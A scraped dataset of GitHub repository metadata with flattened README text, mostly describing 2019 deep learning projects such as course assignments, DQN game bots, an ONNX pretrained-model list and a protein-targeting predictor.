guidance Author Rojan Shiwakoti of class 2018 Computer Networking and IT Security Copyrights reserved to the Author Nepal Police as a client and London Metropolitan University and Islington College as the academic partners,2019-08-30T00:04:33Z,2019-09-05T09:15:26Z,Python,arojan,User,1,1,0,10,master,arojan,1,0,0,0,0,1,0
tianyu-z,Stanford-CS224n-Natural-Language-Processing-with-Deep-Learning,n/a,Stanford CS224n Natural Language Processing with Deep Learning The assignments of the CS224n Natural Language Processing with Deep Learning in Stanford Due to the policy I will no longer share the assignments Thank you for your understanding,2019-09-16T06:01:24Z,2019-10-02T20:21:59Z,n/a,tianyu-z,User,1,1,0,2,master,tianyu-z,1,0,0,0,0,0,0
csci-599-applied-ml-for-games,Adversarial-Deep-Q-Learning-Bot-for-Scotland-Yard,n/a,Adversarial Deep Q Learning Bot for Scotland Yard Scotland Yard is an asymmetric hide and search based board game with imperfect information It is a two sided game searchers called detectives trying to catch the hider called Mr X This proves to be an imperfect environment since the location of Mr X is hidden Previous solutions to play hide and search games all involved using artificial intelligence and graph search algorithms This work aimed to explore a different way to approach these games using Deep Q Learning as a solution Many different model architectures were considered and all their performances were evaluated Bots for Mr X and the detectives was developed and their nuances observed We believe that Deep Q Learning could in fact prove to be a good solution in the case of solving such games in the future especially those with large search spaces The Deep Q learning models are located inside the londonlaw aiclients deeplearning folder https github com anyc londonlaw has been adapted for the purpose of our project,2019-09-12T00:29:16Z,2019-12-03T01:31:15Z,Python,csci-599-applied-ml-for-games,Organization,3,1,0,1,master,shreyasi100,1,0,0,0,0,0,0
XuYongi,Deep-Learning-code-PyTorch-V1.1,n/a,HEAD PyTorchPyTorch Working on migration to Pytorch 1 0 stay tuned pytorch 0 4 1 0 4 0 pytorch 0 4 1 0 4 0 pytorch 0 4 1 0 4 0 pytorch 0 4 1 git checkout v0 2 git checkout v0 3 python2 python3 CPU GPU GPUpython3 python2CPU http 7zh43r com2 z0 glb clouddn com del mindmap png PyTorchPyTorchJupyter Notebooknotebook PyTorch12 PyTorchTensorautograd VariableTensorautogradTensorautograd PyTorchnn50ImageNetResNet PyTorchGPU PyTorchdemo KagglePyTorchdebug GANGAN CharRNN AI Challenger Diamondfan https github com Diamondfan Notebook notebook 50 90 python3python2v0 2v0 3 python2 python3 GPUCPU PyTorch 0 4 1 v1 0 PyTorch 0 2 00 3 git checkout v0 2 v0 3 issuepull request 1 PyTorch http pytorch org anacondapip 2 python git clone https github com chenyuntc PyTorch book git 3 python cd pytorch book pip install r requirements txt Visdom visdom pip install upgrade visdom https github com chenyuntc pytorch book blob 2c8366137b691aaa8fbeeea478cc1611c09e15f5 README md visdom E6 89 93 E4 B8 8D E5 BC 80 E5 8F 8A E5 85 B6 E8 A7 A3 E5 86 B3 E6 96 B9 E6 A1 88 bugissue pull requests Happy Coding http img14 360buyimg com n1 jfs t13339 32 2463730198 217483 e8148c6b 5a41277dNbd1470c1 jpg https search jd com Search keyword pytorch 20 enc utf 8 wq pytorch 20 pvid 8b0d91d7108845ad8cbaf596326f3eb3 http search dangdang com key pytorch 20 C8 EB C3 C5 D3 EB CA B5 BC F9 act input PyTorch V11 5661ccc3c4730722fb19ad44ef39fd4cd7a70b7b,2019-08-30T05:03:13Z,2019-10-10T17:55:15Z,Jupyter Notebook,XuYongi,User,1,1,1,5,master,XuYongi,1,0,0,0,0,0,0
Endthere,DRL_Air_TransferLearning,airsim-simulator#deep-reinforcement-learning#keras-tensorflow#transfer-learning,,2019-08-09T18:14:40Z,2019-11-04T17:52:45Z,Python,Endthere,User,1,1,0,5,master,Endthere,1,0,0,0,0,0,0
michellechlin,Machine-Learning-with-Python,n/a,Machine Learning with Python Udemy Bootcamp General Info general info Technologies technologies Usage usage Certificate certificate References references General Info This repository is to use Python and Jupyter Notebook to learn data science and machine learning This course taught by Jose Portilla sets a right amount of structure and flexibility to learn fundamental concepts with NumPy Pandas Seaborn Matplotlib Plotly Scikit Learn Machine Learning ML Tensorflow Natural Language Process and Deep Learning The concepts were well explained on just about everything to some degree however the theory of machine learning algorithms is not covered too much You might be interested in pairing this course with a more theory intensive course Andrew Ng s ML course using MATLAB programming on Coursera see another repository Technologies I completed this course with Mac Terminal Command Anaconda Python 3 Jupyter Notebook AWS EC2 for Big Data and PySpark Section Usage Click Terminal to open the terminal window jupyter notebook launch the Jupyter Notebook App Useful commands clear clear the command line Ctr C shut down the Jupyter Notebook Certificate Course Certificate https www udemy com certificate UC Q8OMH8GY Completed on August 28 2019 References 1 https www udemy com python for data science and machine learning bootcamp 2 https www pieriandata com 3 Getting Spark Python and Jupyter Notebook running on Amazon EC2 https medium com josemarcialportilla getting spark python and jupyter notebook running on amazon ec2 dec599e1c297,2019-08-23T03:58:38Z,2019-09-13T17:58:53Z,Jupyter Notebook,michellechlin,User,1,1,0,22,master,michellechlin,1,0,0,0,0,0,0
youben11,udacity-deepreinforcementlearning-nd,n/a,Udacity Deep Reinforcement Learning Nanodegree Projects I worked on while following the Deep Reinforcement Learning Nanodegree at Udacity Grid World Implemented the Grid World environment and an agent using a Monte Carlo method The project is under gridworld here gridworld OpenAI Gym s Taxi v2 task My solution for the OpenAI Gym s Taxi v2 task solved the task using Sarsa SarsaMax Expected Sarsa and Constant alpha GLIE Monte Carlo Control You can find the listing of the results I got with each algorithm under the project dir here taxi v2 Navigation My solution for the first Udacity DRLND project Navigation which consists of training an agent capable of collecting yellow bananas and avoiding blue ones while navigating in a square world The project is under navigation here navigation Continuous Control My solution for the second Udacity DRLND project Continuous Control which is about training a double jointed arm to move to some target locations The project can be found here continuouscontrol Collaboration and Competition My solution for the third and final Udacity DRLND project Collaboration and Competition which is about training two agents controlling rackets to bounce a ball over a net The project can be found here collaborationandcompetition,2019-08-08T09:49:15Z,2019-11-05T16:55:08Z,Jupyter Notebook,youben11,User,1,1,0,16,master,youben11,1,0,0,0,0,0,0
jonnakutip,Sudoku_MachineLearning,data-visualization#machine-learning#neural-networks#prediction#suduko,SudokuMachineLearning Authors Mr Pavan Kumar Jonnakuti Dr Siva Srinivas Kolukula Trained a deep neural network to solve any given sudoku puzzle,2019-09-05T11:30:29Z,2019-09-06T06:58:21Z,MATLAB,jonnakutip,User,1,1,0,3,master,jonnakutip,1,0,0,0,0,0,0
wangmu89,Learning-AI,n/a,Learning AI Machine Learning https study 163 com course courseMain htm courseId 1004570029,2019-08-13T05:58:37Z,2019-08-13T06:10:02Z,n/a,wangmu89,User,1,1,0,2,master,wangmu89,1,0,0,0,0,0,0
thefakhir,deeplearning-dataset,n/a,,2019-09-11T15:16:17Z,2019-09-24T06:56:22Z,Python,thefakhir,User,1,1,0,2,master,thefakhir,1,0,0,0,0,0,0
ShivamPanchal,Transfer-Learning---List-of-all-Pretrained-Models,n/a,Transfer Learning List of all Pretrained Models Models Read the Usage usage section below for more details on the file formats in the ONNX Model Zoo onnx pb npz and starter Python code for validating your ONNX model using test data Image Classification imageclassification Object Detection Image Segmentation objectdetection Body Face Gesture Analysis bodyanalysis Image Manipulation imagemanipulation Speech Audio Processing speech Machine Comprehension machinecomprehension Machine Translation machinetranslation Language Modelling language Visual Question Answering Dialog visualqna Other interesting models others Image Classification This collection of models take images as input then classifies the major objects in the images into 1000 object categories such as keyboard mouse pencil and many animals Model Class Reference Description MobileNet vision classification mobilenet Sandler et al https arxiv org abs 1801 04381 Light weight deep neural network best suited for mobile and embedded vision applications Top 5 error from paper 10 ResNet vision classification resnet He et al https arxiv org abs 1512 03385 A CNN model up to 152 layers Uses shortcut connections to achieve higher accuracy when classifying images Top 5 error from paper 3 6 SqueezeNet vision classification squeezenet Iandola et al https arxiv org abs 1602 07360 A light weight CNN model providing AlexNet level accuracy with 50x fewer parameters Top 5 error from paper 20 VGG vision classification vgg Simonyan et al https arxiv org abs 1409 1556 Deep CNN model up to 19 layers Similar to AlexNet but uses multiple smaller kernel sized filters that provides more accuracy when classifying images Top 5 error from paper 8 AlexNet vision classification alexnet Krizhevsky et al https papers nips cc paper 4824 imagenet classification with deep convolutional neural networks pdf A Deep CNN model up to 8 layers where the input is an image and the output is a vector of 1000 numbers Top 5 error from paper 15 GoogleNet vision classification inceptionandgooglenet googlenet Szegedy et al https arxiv org pdf 1409 4842 pdf Deep CNN model up to 22 layers Comparatively smaller and faster than VGG and more accurate in detailing than AlexNet Top 5 error from paper 6 7 CaffeNet vision classification caffenet Krizhevsky et al https ucb icsi vision group github io caffe paper caffe pdf Deep CNN variation of AlexNet for Image Classification in Caffe where the max pooling precedes the local response normalization LRN so that the LRN takes less compute and memory RCNNILSVRC13 vision classification rcnnilsvrc13 Girshick et al https arxiv org abs 1311 2524 Pure Caffe implementation of R CNN for image classification This model uses localization of regions to classify and extract features from images DenseNet 121 vision classification densenet 121 Huang et al https arxiv org abs 1608 06993 Model that has every layer connected to every other layer and passes on its own feature providing strong gradient flow and more diversified features InceptionV1 vision classification inceptionandgooglenet inceptionv1 Szegedy et al https arxiv org abs 1409 4842 This model is same as GoogLeNet implemented through Caffe2 that has improved utilization of the computing resources inside the network and helps with the vanishing gradient problem Top 5 error from paper 6 7 InceptionV2 vision classification inceptionandgooglenet inceptionv2 Szegedy et al https arxiv org abs 1512 00567 Deep CNN model for Image Classification as an adaptation to Inception v1 with batch normalization This model has reduced computational cost and improved image resolution compared to Inception v1 Top 5 error from paper 4 82 ShuffleNet vision classification shufflenet Zhang et al https arxiv org abs 1707 01083 Extremely computation efficient CNN model that is designed specifically for mobile devices This model greatly reduces the computational cost and provides a 13x speedup over AlexNet on ARM based mobile devices Compared to MobileNet ShuffleNet achieves superior performance by a significant margin due to it s efficient structure Top 1 error from paper 7 8 ZFNet 512 vision classification zfnet 512 Zeiler et al https arxiv org abs 1311 2901 Deep CNN model up to 8 layers that increased the number of features that the network is capable of detecting that helps to pick image features at a finer level of resolution Top 5 error from paper 14 3 Domain based Image Classification This subset of models classify images for specific domains and datasets Model Class Reference Description MNIST Handwritten Digit Recognition vision classification mnist Convolutional Neural Network with MNIST https github com Microsoft CNTK blob master Tutorials CNTK103DMNISTConvolutionalNeuralNetwork ipynb Deep CNN model for handwritten digit identification Object Detection Image Segmentation Object detection models detect the presence of multiple objects in an image and segment out areas of the image where the objects are detected Semantic segmentation models partition an input image by labeling each pixel into a set of pre defined categories Model Class Reference Description Tiny YOLOv2 vision objectdetectionsegmentation tinyyolov2 Redmon et al https arxiv org pdf 1612 08242 pdf A real time CNN for object detection that detects 20 different classes A smaller version of the more complex full YOLOv2 network SSD vision objectdetectionsegmentation ssd Liu et al https arxiv org abs 1512 02325 Single Stage Detector real time CNN for object detection that detects 80 different classes Faster RCNN vision objectdetectionsegmentation faster rcnn Ren et al https arxiv org abs 1506 01497 Increases efficiency from R CNN by connecting a RPN with a CNN to create a single unified network for object detection that detects 80 different classes Mask RCNN vision objectdetectionsegmentation mask rcnn He et al https arxiv org abs 1703 06870 A real time neural network for object instance segmentation that detects 80 different classes Extends Faster R CNN as each of the 300 elected ROIs go through 3 parallel branches of the network label prediction bounding box prediction and mask prediction YOLO v2 Redmon et al https arxiv org abs 1612 08242 A CNN model for real time object detection system that can detect over 9000 object categories It uses a single network evaluation enabling it to be more than 1000x faster than R CNN and 100x faster than Faster R CNN contribute contribute md YOLO v3 vision objectdetectionsegmentation yolov3 Redmon et al https pjreddie com media files papers YOLOv3 pdf A deep CNN model for real time object detection that detects 80 different classes A little bigger than YOLOv2 but still very fast As accurate as SSD but 3 times faster DUC vision objectdetectionsegmentation duc Wang et al https arxiv org abs 1702 08502 Deep CNN based pixel wise semantic segmentation model with 80 mIOU models semanticsegmentation DUC README md metric mean Intersection Over Union Trained on cityscapes dataset which can be effectively implemented in self driving vehicle systems FCN Long et al https people eecs berkeley edu jonlong longshelhamerfcn pdf Deep CNN based segmentation model trained end to end pixel to pixel that produces efficient inference and learning Built off of AlexNet VGG net GoogLeNet classification methods contribute contribute md Body Face Gesture Analysis Face detection models identify and or recognize human faces and emotions in given images Body and Gesture Analysis models identify gender and age in given image Model Class Reference Description ArcFace vision bodyanalysis arcface Deng et al https arxiv org abs 1801 07698 A CNN based model for face recognition which learns discriminative features of faces and produces embeddings for input face images CNN Cascade Li et al https www cv foundation org openaccess contentcvpr2015 papers LiAConvolutionalNeural2015CVPRpaper pdf The model operates at multiple resolutions quickly rejecting the background regions in the fast low resolution stages in an image and carefully evaluates a small number of challenging candidates in the last high resolution stage contribute contribute md Emotion FerPlus vision bodyanalysis emotionferplus Barsoum et al https arxiv org abs 1608 01041 Deep CNN for emotion recognition trained on images of faces Age and Gender Classification using Convolutional Neural Networks Levi et al https www openu ac il home hassner projects cnnagegender CNNAgeGenderEstimation pdf This model accurately classifies gender and age even the amount of learning data is limited contribute contribute md Image Manipulation Image manipulation models use neural networks to transform input images to modified output images Some popular models in this category involve style transfer or enhancing images by increasing resolution Model Class Reference Description Unpaired Image to Image Translation using Cycle consistent Adversarial Network Zhu et al https arxiv org abs 1703 10593 The model uses learning to translate an image from a source domain X to a target domain Y in the absence of paired examples contribute contribute md Super Resolution with sub pixel CNN vision superresolution subpixelcnn2016 Shi et al https arxiv org abs 1609 05158 A deep CNN that uses sub pixel convolution layers to upscale the input image Fast Neural Style Transfer vision styletransfer fastneuralstyle Johnson et al https arxiv org abs 1603 08155 This method uses a loss network pretrained for image classification to define perceptual loss functions that measure perceptual differences in content and style between images The loss network remains fixed during the training process Speech Audio Processing This class of models uses audio data to train models that can identify voice generate music or even read text out loud Model Class Reference Description Speech recognition with deep recurrent neural networks Graves et al https www cs toronto edu fritz absps RNN13 pdf A RNN model for sequential data for speech recognition Labels problems where the input output alignment is unknown contribute contribute md Deep voice Real time neural text to speech Arik et al https arxiv org abs 1702 07825 A DNN model that performs end to end neural speech synthesis Requires fewer parameters and it is faster than other systems contribute contribute md Sound Generative models WaveNet A Generative Model for Raw Audio https arxiv org abs 1609 03499 A CNN model that generates raw audio waveforms Has predictive distribution for each audio sample Generates realistic music fragments contribute contribute md Machine Comprehension This subset of natural language processing models that answer questions about a given context paragraph Model Class Reference Description Bidirectional Attention Flow text machinecomprehension bidirectionalattentionflow Seo et al https arxiv org pdf 1611 01603 A model that answers a query about a given context paragraph BERT Squad text machinecomprehension bert squad Devlin et al https arxiv org pdf 1810 04805 pdf This model answers questions based on the context of the given input paragraph Machine Translation This class of natural language processing models learns how to translate input text to another language Model Class Reference Description Neural Machine Translation by jointly learning to align and translate Bahdanau et al https arxiv org abs 1409 0473 Aims to build a single neural network that can be jointly tuned to maximize the translation performance contribute contribute md Google s Neural Machine Translation System Wu et al https arxiv org abs 1609 08144 This model helps to improve issues faced by the Neural Machine Translation NMT systems like parallelism that helps accelerate the final translation speed contribute contribute md Language Modelling This subset of natural language processing models learns representations of language from large corpuses of text Model Class Reference Description Deep Neural Network Language Models Arisoy et al https pdfs semanticscholar org a177 45f1d7045636577bcd5d513620df5860e9e5 pdf A DNN acoustic model Used in many natural language technologies Represents a probability distribution over all possible word strings in a language contribute contribute md Visual Question Answering Dialog This subset of natural language processing models uses input images to answer questions about those images Model Class Reference Description VQA Visual Question Answering Agrawal et al https arxiv org pdf 1505 00468v6 pdf A model that takes an image and a free form open ended natural language question about the image and outputs a natural language answer contribute contribute md Yin and Yang Balancing and Answering Binary Visual Questions Zhang et al https arxiv org pdf 1511 05099 pdf Addresses VQA by converting the question to a tuple that concisely summarizes the visual concept to be detected in the image Next if the concept can be found in the image it provides a yes or no answer Its performance matches the traditional VQA approach on unbalanced dataset and outperforms it on the balanced dataset contribute contribute md Making the V in VQA Matter Goyal et al https arxiv org pdf 1612 00837 pdf Balances the VQA dataset by collecting complementary images such that every question is associated with a pair of similar images that result in two different answers to the question providing a unique interpretable model that provides a counter example based explanation contribute contribute md Visual Dialog Das et al https arxiv org abs 1611 08669 An AI agent that holds a meaningful dialog with humans in natural conversational language about visual content Curates a large scale Visual Dialog dataset VisDial contribute contribute md Other interesting models There are many interesting deep learning models that do not fit into the categories described above The ONNX team would like to highly encourage users and researchers to contribute contribute md their models to the growing model zoo Model Class Reference Description Text to Image Generative Adversarial Text to image Synthesis https arxiv org abs 1605 05396 Effectively bridges the advances in text and image modeling translating visual concepts from characters to pixels Generates plausible images of birds and flowers from detailed text descriptions contribute contribute md Time Series Forecasting Modeling Long and Short Term Temporal Patterns with Deep Neural Networks https arxiv org pdf 1703 07015 pdf The model extracts short term local dependency patterns among variables and to discover long term patterns for time series trends It helps to predict solar plant energy output electricity consumption and traffic jam situations contribute contribute md Recommender systems DropoutNet Addressing Cold Start in Recommender Systems http www cs toronto edu mvolkovs nips2017deepcf pdf A collaborative filtering method that makes predictions about an individuals preference based on preference information from other users contribute contribute md Collaborative filtering Neural Collaborative Filtering http,2019-09-03T18:51:14Z,2019-09-04T15:49:42Z,n/a,ShivamPanchal,User,0,1,0,10,master,ShivamPanchal,1,0,0,0,0,0,0
lecchon,FaceAttributes,n/a,,2019-09-16T08:33:59Z,2019-09-30T08:21:14Z,Python,lecchon,User,1,1,0,0,master,,0,0,0,0,0,0,0
AravindJaimon,Seminar-Presentation,n/a,presento Presento is a clean simple and extensible template for presentations supported by XeTeX and Beamer XeTeX is a TeX typesetting engine that can be thought http tex stackexchange com questions 3393 what is xetex exactly and why should i use it of as standard LaTeX pdftex with support for Open Type Fonts Beamer is a widely used LaTeX class for presentations and slides See in action Minimal demo demo presento pdf PDF compiled version of presento tex A group presentation demo BoSfinalpresentation pdf PDF for a class project for a course on Business of Software A research presentation demo settapresentation pdf on broadly theoretical computer science Installation For novice TeX users it is highly recommended to use Overleaf https www overleaf com latex templates presento beamer theme knsxtwmfpttq a fascinating online TeX editor The installation is as simple as downloading presento and uploading to Overleaf as a new project Disclaimer I am an external advisor https www overleaf com advisors to Overleaf and often advocate https www overleaf com blog 267 overleaf advisor of the month ratul saha for TeX and Overleaf To use presento in your local computer install XeTeX and the compulsory packages listed below These mostly come as part of the popular TeX engines like MiKTeX http miktex org Compulsory packages xcolor used for adding colors fontspec supports for custom local fonts setspace handles the spacing between lines tikz used to draw for various shapes enumitem custom lists Fonts The primary fonts in use are Montserrat http montserrat zkysky com ar en by Julieta Ulanovsky Lato http www latofonts com Light by ukasz Dziedzic and Noto https www google com get noto Sans by Google For small caps Algreya Sans http www huertatipografica com fonts alegreya sans ht small caps variation by Juan Pablo del Peral is used Inconsolata http en wikipedia org wiki Inconsolata by Raph Levien is used as a monospaced font Except Noto Sans which is licensed under Apache License v2 00 all other fonts used are under SIL Open Font License v1 10 In short all the fonts are free to use and redistribute under the terms of the respective licenses The fonts and their usage are already baked into the template However for custom use the following LaTeX commands without any arguments are provided montserratfont notosansfont latolightfont inconsolatafont Colors The color palette is vibrant bold yet minimal The following colors can be used with the colorcolorName command colorlgray FAFAFA light gray colordgray 795548 dark gray colorhgray 212121 heavy dark gray colororange E65100 orange colorgreen 009688 green colorblue 0277BB blue Custom Macros hugetexttext sets the huge bold text It should only be used for short and bold statements largetexttext sets a large text It should be used as subheadings lines with less than 40 characters setnotetext sets a smaller text with color gray It should be used for showing notes such as url references etc framecard optionalColor mainText sets the big bold mainText at center with a background color of optionalColor which is colorgreen by default It should be used for flashing ideas introducing subsections etc framepic optionalOpacity imagecontent sets the image as a background of the full frame with opacity set to optionalOpacity The frame may have content inside Custom environments beginbaseitemize endbaseitemize this is standard itemize without any indentation It should be used for normal listing beginfullpageitemize endfullpageitemize this is used for listing in full frame The items in the list are properly spaced It should be used for listing points in one full frame Concluding remarks The typography and design principles have been largly influenced by notable designers around the world Sincere thanks goes to Prof Dr Ing Andr Miede http www miede de developer of Classicthesis https code google com p classicthesis Robert Bringhurst http en wikipedia org wiki RobertBringhurst author of The Elements of Typographic Style Richard Rutter http clagnut com creator of The Elements of Typographic Style Applied to the Web Tim Brown developer of Modular Scale http modularscale com designers at Google https google com design among others This work is not licensed Feel free to use modify redistribute Comments and suggestions are welcome FAQ How do I add customize the template You can change the title subtitle etc in config presento config tex If you want to add new packages or newcommands put them in config custom command tex An example of usepackagetextpos etc are already present but not compulsory for the basic template However if you want to change the template feel free to modify config presento sty Be brave While using framepic why is the image not shown in full screen Please check the image size and aspect ratio While not obligatory for any rules you may want to note that the standard beamer template size is 12 8cm x 9 6cm How do I change the font sizes The spacing and font sizes are carefully designed Change font sizes by using fontsizesizeleadingselectfont only if you are sure of what you are doing Why does the text in my presentation look pale High contrast of black white is not advisable for presenting with high quality projectors Thus the background is set to light gray and the text color is set to heavy dark gray If you are unsure about the quality of the projector and or the text looks pale comment out the following in config presento config tex setbeamercolorbackground canvasbg colorlgray setbeamercolornormal textfg colorhgray Do I need to download the fonts No the fonts are already present in the fonts subfolder The corresponding licenses can be found in LICENSE subfolder How do I add bullet points to items in baseitemize of fullpageitemize Use itemR instead of item,2019-08-27T02:05:56Z,2019-09-13T05:40:12Z,TeX,AravindJaimon,User,1,1,0,6,master,AravindJaimon,1,0,0,0,0,0,0
toytag,DQN-for-gym,n/a,DQN model for gym env This repo contains several variation of DQN models that can learn to play video games provided by gym env,2019-08-18T21:52:03Z,2019-12-10T22:39:12Z,Python,toytag,User,1,1,0,6,master,toytag#dependabot[bot],2,0,0,0,0,0,1
BorjaEst,neurnet,n/a,neurnet Deep learning application based on Erlang and Python modules Important If developing with parallel applications into release use checkouts to solve dependencies,2019-08-14T17:34:43Z,2019-08-16T07:57:21Z,Erlang,BorjaEst,User,1,1,0,2,master,BorjaEst,1,0,0,0,0,0,0
x6rulin,FaceRec,n/a,FaceRec Discriminative feature learning approaches for deep face recognition,2019-08-07T14:18:26Z,2019-10-23T09:07:39Z,Python,x6rulin,User,0,1,0,38,master,x6rulin,1,0,0,0,0,0,0
soonwoohong,DNA-NCs,n/a,DNA NCs Deep learning for the prediction of DNA NCs,2019-09-12T22:44:06Z,2019-11-08T23:59:17Z,Jupyter Notebook,soonwoohong,User,1,1,0,3,master,soonwoohong,1,0,0,0,0,0,0
MRCIEU,awesome-ai,artificial-intelligence#awesome-list#bioinformatics#deep-learning#machine-learning#natural-language-processing#network-analysis#statistical-learning,awesome ai Awesome https cdn rawgit com sindresorhus awesome d7305f38d29fed78fa85652e3a63e154dd8e8829 media badge svg https github com sindresorhus awesome Maintenance https img shields io maintenance yes 2019 PRs Welcome https img shields io badge PRs welcome brightgreen svg style flat square http makeapullrequest com Awesome list for all things AI ML and deep learning images AI vs ML vs Deep Learning png Table of Contents awesome ai awesome ai Concepts concepts Neural Machine Translation attention mechanisms neural machine translation attention mechanisms Transformer transformer Universal Transformers universal transformers node2vec node2vec Topic graph analytics topic graph analytics Tooling tooling general purpose general purpose probalistic inference probalistic inference graph graph Tutorials tutorials Research papers blog articles research papers blog articles NLP methods nlp methods NLP applications nlp applications Transformer applications transformer applications Awesome lists awesome lists General general Frameworks ecosystems frameworks ecosystems Awesome papers awesome papers NLP nlp Graph theory graph theory Knowledge graph knowledge graph Notebooks notebooks Concepts Neural Machine Translation attention mechanisms Visualizing A Neural Machine Translation Model Mechanics of Seq2seq Models With Attention https jalammar github io visualizing neural machine translation mechanics of seq2seq models with attention Transformer A model that uses attention to boost the speed with which these models can be trained http jalammar github io illustrated transformer Universal Transformers The Universal Transformer is an extension to the Transformer models which combines the parallelizability and global receptive field of the Transformer model with the recurrent inductive bias of RNNs which seems to be better suited to a range of algorithmic and natural language understanding sequence to sequence problems http mostafadehghani com 2019 05 05 universal transformers node2vec An algorithmic framework for learning useful representation from highly structured objects such as graphs http sujitpal blogspot com 2019 05 node2vec graph embeddings for neurips html utmsource feedburner utmmedium email utmcampaign Feed 3A SalmonRun 28Salmon Run 29 Topic graph analytics Benchmark of popular graph network packages in python r https www timlrx com 2019 05 05 benchmark of popular graph network packages Tooling general purpose probalistic inference graph dgl Python package built to ease deep learning on graph on top of existing DL frameworks https github com dmlc dgl cdlib Community Discovery Library for networkx and igraph https github com GiulioRossetti cdlib Embedding Vis https github com meltzerpete Embedding Vis OpenNE https github com thunlp OpenNE Tutorials fastai practical deep learning for coders https course fast ai practicalAI https github com GokuMohandas practicalAI Machine Learning Tutorials https github com ujjwalkarn Machine Learning Tutorials Research papers blog articles NLP methods Parikh A P Tckstrm O Das D and Uszkoreit J 2016 A decomposable attention model for natural language inference arXiv preprint arXiv 1606 01933 https arxiv org abs 1606 01933 Vaswani A Shazeer N Parmar N Uszkoreit J Jones L Gomez A N Kaiser and Polosukhin I 2017 Attention is all you need In Advances in neural information processing systems pp 5998 6008 https papers nips cc paper 7181 attention is all you need pdf Devlin J Chang M W Lee K and Toutanova K 2018 Bert Pre training of deep bidirectional transformers for language understanding arXiv preprint arXiv 1810 04805 https arxiv org pdf 1810 04805 pdf The illustrated GPT 2 Visulaizing Transformer Language Models https jalammar github io illustrated gpt2 Transformers from scratch http www peterbloem nl blog transformers Searching for Answer Candidate Passages with Solr and Anserini http sujitpal blogspot com 2019 09 searching for answer candidate passages html Subramanian et al 2019 On extractive and abstractive neural document summarization with transformer language models https arxiv org abs 1909 03186 NLP applications Wang et al 2018 Ontology Alignment in the Biomedical Domain Using Entity Definitions and Context https arxiv org pdf 1806 07976 pdf Wang et al 2019 Extracting evidence of supplement drug interactions from literature https arxiv org pdf 1909 08135 pdf Transformer applications Bert2Tag BERT key phrase tagging https github com thunlp Bert2Tag Awesome lists General awesome deep learning https github com ChristosChristofidis awesome deep learning awesome deep learning resources https github com guillaume chevalier Awesome Deep Learning Resources Frameworks ecosystems awesome pytorch list https github com bharathgs Awesome pytorch list the incredible pytorch https github com ritchieng the incredible pytorch awesome ternsorflow https github com jtoy awesome tensorflow keras resources https github com fchollet keras resources DataSciencePython https github com ujjwalkarn DataSciencePython DataScienceR https github com ujjwalkarn DataScienceR Awesome papers awesome deep learning papers https github com terryum awesome deep learning papers awesome decision tree papers https github com benedekrozemberczki awesome decision tree papers awesome gradient boosting papers https github com benedekrozemberczki awesome gradient boosting papers must read papers on graph neural network https github com thunlp GNNPapers deep learning biology https github com hussius deeplearning biology awesome deepbio https github com gokceneraslan awesome deepbio NLP nlp roadmap https github com graykode nlp roadmap awesome nlp https github com keon awesome nlp awesome bert https github com Jiakui awesome bert awesome word2vec https github com MaxwellRebo awesome 2vec awesome embedding models https github com Hironsan awesome embedding models NCBI BioNLP Research Group PI Zhiyong Lu https github com ncbi nlp awesome bert https github com Jiakui awesome bert thunlp https github com thunlp awesome paper repos neural relation extraction NRE https github com thunlp NREPapers machine reading comprehension https github com thunlp RCPapers network representation learning NRL network embedding NE https github com thunlp NRLPapers graph neural networks GNN https github com thunlp GNNPapers knowledge representation learning KRL knowledge embedding KE https github com thunlp KRLPapers Graph theory awesome community detection https github com benedekrozemberczki awesome community detection awesome graph classification https github com benedekrozemberczki awesome graph classification awesome network analysis https github com briatte awesome network analysis awesome network embedding https github com chihming awesome network embedding graph based deep learning literature https github com naganandy graph based deep learning literature LiteratureDL4Graph https github com DeepGraphLearning LiteratureDL4Graph Knowledge graph shaoxiongji awesome knowledge graph https github com shaoxiongji awesome knowledge graph totogo awesome knowledge graph https github com totogo awesome knowledge graph BrambleXu knowledge graph learning https github com BrambleXu knowledge graph learning husthuke awesome knowledge graph in Chinese https github com husthuke awesome knowledge graph Notebooks NLP graphs https github com sujitpal nlp graph examples,2019-08-23T15:38:25Z,2019-11-25T14:07:27Z,n/a,MRCIEU,Organization,6,1,0,30,master,YiLiu6240#elswob,2,0,0,0,0,0,0
omerfarukkkoc,RailwayDefectsDetection,n/a,RailwayDefectsDetection Railway Surface Defects Detection Tensorflow Deep Learning Project Example Output Images https github com omerfarukkkoc RailwayDefectsDetection blob master 1 png https github com omerfarukkkoc RailwayDefectsDetection blob master 2 png https github com omerfarukkkoc RailwayDefectsDetection blob master 3 png Dataset is Here http icn bjtu edu cn Visint resources RSDDs aspx,2019-09-12T14:53:52Z,2019-11-27T07:11:11Z,Python,omerfarukkkoc,User,1,1,0,4,master,omerfarukkkoc,1,0,0,0,0,0,0
JJAlmagro,TargetP-2.0,n/a,TargetP 2 0 Detecting Sequence Signals in Targeting Peptides Using Deep Learning Synopsis Repository with the code used to train and test the tool TargetP 2 0 Authors J J Almagro Armenteros M Salvatore O Emanuelsson O Winther G von Heijne A Elofsson H Nielsen Software requirements Python 3 and Tensorflow 1 7 where used to train and test the model Additional packages are numpy processing of the data and sklearn metrics Data The protein sequences are encoded in BLOSUM62 and trimmed up to 200 amino acids The sequences are stored in one npz file named targetpdata npz in the data folder The file contains the following arrays Protein sequences x encoded in BLOSUM62 and trimmed up to 200 amino acids Sequences smaller than 200 amino acids are padded Peptide types ytype that the input protein can be classified as They can be noTP 0 SP 1 mTP 2 cTP 3 or luTP 4 Cleavage site ycs is the position where the sorting signal is cleaved This is enconded as a zero vector of length 200 with 1 in the cleavage site position Protein organism org defines whether the protein is from plant 1 or non plant 0 Sequence length lenseq of the proteins being the maximum length 200 Partition assignment fold of each example The protein data was divided in 5 partitions based on their sequence similarity This vector contains the partition that each protein belongs to which is used in the cross validation procedure Accession number ids of the proteins Training The training is performed running the script train py This is a minimal example python train py d targetpdata npz By default the training will run on the CPU To select the GPU to run the training for example GPU 0 use python train py d targetpdata npz g 0 Testing Once the training is finished run the test py script to get the final performance of the model It is necessary to define the folder where the trained models have been saved python test py d targetpdata npz m savedmodels,2019-09-04T12:26:45Z,2019-09-05T14:07:24Z,Python,JJAlmagro,User,1,1,0,0,master,,0,0,0,0,0,0,0
Shpota,cs224n,cs224n#cs224nwinter2019#deep-learning#nlp#python,cs224n Home assignments for CS224n Natural Language Processing with Deep Learning,2019-08-14T13:43:59Z,2019-11-15T07:47:46Z,n/a,Shpota,User,1,1,0,1,master,Shpota,1,0,0,0,0,0,0
